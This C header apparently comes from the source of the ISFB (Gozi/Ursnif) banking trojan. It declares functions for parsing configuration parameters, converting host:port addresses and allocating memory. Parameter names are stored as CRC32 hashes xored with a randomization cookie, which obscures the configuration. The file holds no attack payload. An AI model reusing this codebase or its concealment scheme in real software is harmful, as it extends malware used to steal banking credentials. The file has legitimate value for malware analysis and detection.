//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
// ISFB project. Version 2.2
//	
// module: common.h
// $Revision: 383 $
// $Date: 2014-10-23 18:31:51 +0400 (Чт, 23 окт 2014) $
// description:
//  Commonly used functions and variables.


// Save file flags
#define	FILE_FLAG_OVERWRITE		1	// overwrite an existing file
#define	FILE_FLAG_APPEND		2	// append an existing file
#define	FILE_FLAG_WAIT_SHARE	4	// wait until a file could be shared

//	Describes INI-file parameter of type: NAME=VALUE
typedef	struct _INI_PARAMETER
{
	ULONG	NameHash;	// CRC32 hash of the parameter name
	ULONG	Flags;		// variouse flags
	union	
	{
		PCHAR		pValue;		// pointer to the string representing value of the parameter
		ULONG		oValue;		// offset of the the value relative to this structure address
		ULONGLONG	Padding0;	// used to equalize structure sizes between x86 and x64 machines
	};
	union 
	{
		PCHAR		pUid;		// pointer to the string representing unique ID of the parameter (if any)
		ULONG		oUid;		// offset of the the unique ID string relative to this structure address
		ULONGLONG	Padding1;	// used to equalize structure sizes between x86 and x64 machines
	};
} INI_PARAMETER, *PINI_PARAMETER;

// INI_PARAMETER flags
#define	INIP_OFFSET				1	// contains offset instead of a pointer 

typedef struct _INI_PARAMETERS
{
	union
	{
		ULONG		Count;		// total number of the parameters avaliable
		ULONGLONG	Padding;	// used to equalize structure sizes between x86 and x64 machines
	};
	INI_PARAMETER	Parameter[];	// parameters
} INI_PARAMETERS, *PINI_PARAMETERS;


#ifdef __cplusplus
extern "C" {
#endif

PVOID __stdcall	AppAlloc(ULONG Size);
VOID __stdcall	AppFree(PVOID pMem);


// ---- from ini.c ----------------------------------------------------------------------------------------------------------

//
//	Parses the specified parameter string of type: NAME=VALUE, devided by the specified delimiter.
//	Allocates and fills INI_PARAMETERS sructure, cotaining parameter hashes and pointers to specific values.
//
WINERROR __stdcall IniParseParamString(
	PCHAR	ParamStr,				// parameter string to parse
	CHAR	Delimiter,				// delimiter for the parameters
	PINI_PARAMETERS* ppParameters,	// variable to return pointer to INI_PARAMETERS structure
	BOOL	bCaseSensitive			// specifies how to parse parameter names and values: case sensitive or not
	);

//
//	Parces the specified file containing parameter strings of type: NAME=VALUE.
//	Each parameter string starts with a new line.
//
WINERROR __stdcall IniParseParamFile(
	PCHAR	pParamStr,				// parameter string to parse
	CHAR	UidDelimeter,			// delimiter for UID of a parameter
	CHAR	ValueDelimiter,			// delimiter for a value
	PINI_PARAMETERS* ppParameters,	// variable to return pointer to INI_PARAMETERS structure
	BOOL	bNameCaseSensitive,		// specifies how to parse parameter names: case sensitive or not
	BOOL	bValueCaseSensitive,	// specifies how to parse parameter values: case sensitive or not
	ULONG	NameCookie				// name randomization cookie to xor a prarameter name hash with it
	);

//
//	Scans the specified INI_PARAMETERS structure for a parameter with the specified Name hash.
//	Returns pointer to the value of the parameter or NULL if the parameter not found.
//
PCHAR __stdcall IniGetParamValue(
	ULONG	NameHash,				// CRC32 hash of the name to find a value for
	PINI_PARAMETERS	pParameters,	// target parameters
	ULONG	NameCookie				// name randomization cookie to xor a prarameter name hash with it
	);

//
//	Allocates a memory buffer of the specified MinimumLength and duplicates the specified source string into it.
//	If MinimumLength is larger then a length of the specified source string then unused buffer is filled with zeoroes. 
//
LPTSTR __stdcall IniDupStr(
	LPTSTR	SourceStr,		// a string to duplicate
	ULONG	MinimumLength	// minimum size of the string buffer in chars
	);

//
//	Converts the specified address string of an HOST:PORT format into the SOCKADDR_IN structure.
//
BOOL IniStringToTcpAddress(
	LPTSTR			pIpStr,		// address string of an IP:PORT format
	SOCKADDR_IN*	pAddress,	// pointer to the structure that receives TCP/IP address
	BOOL			bPort		// TRUE if the address has to contain TCP port number
	);

//
//	Packs whole INI_PARAMETERS structure including all it's data into the single memory buffer.
//	Returns pointer to it and the size of the buffer.
//
WINERROR IniPackParameters(
	PINI_PARAMETERS		pIniParams,
	PINI_PARAMETERS*	ppIniParams,
	PULONG				pSize
	);

//
//	Parses array of string with delimiters.
//	Creates array of pointers to those strings.
//
ULONG IniBuildArrayFromString(
	LPTSTR		pString,
	CHAR		Delimiter,
	LPTSTR**	ppArray
	);


//
//	Scans for the specified param value modified with g_CsCookie.
//
#define	IniGetParamValueWithCookie(NameHash, ppParameters)	IniGetParamValue(NameHash, ppParameters, g_CsCookie)

#ifdef __cplusplus
}
#endif